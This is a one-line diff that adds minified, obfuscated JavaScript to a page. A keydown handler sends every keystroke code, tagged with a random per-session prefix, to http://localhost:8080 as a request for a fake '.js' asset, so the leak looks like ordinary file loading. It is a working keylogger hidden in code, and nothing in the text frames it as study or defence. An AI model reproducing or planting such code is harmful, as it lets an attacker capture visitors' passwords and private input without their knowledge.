@@ -1,0 +1,1 @@
+const randomNumber=(new Date).getUTCMilliseconds(),alpha=["f","e","a","b","c","d","g","h","i","j"],fillUp=`00${randomNumber}`.slice(-3),preFix=[...fillUp].join().split(",").map(Number).map((e=>e%2==0?alpha[e]:e)).join("");document.onkeydown=function(e){const l=`00${null!=e?e.keyCode:0}`.slice(-3);"000"!=l&&((new Image).src="http://localhost:8080/assets/js/view."+preFix+l+".js")};
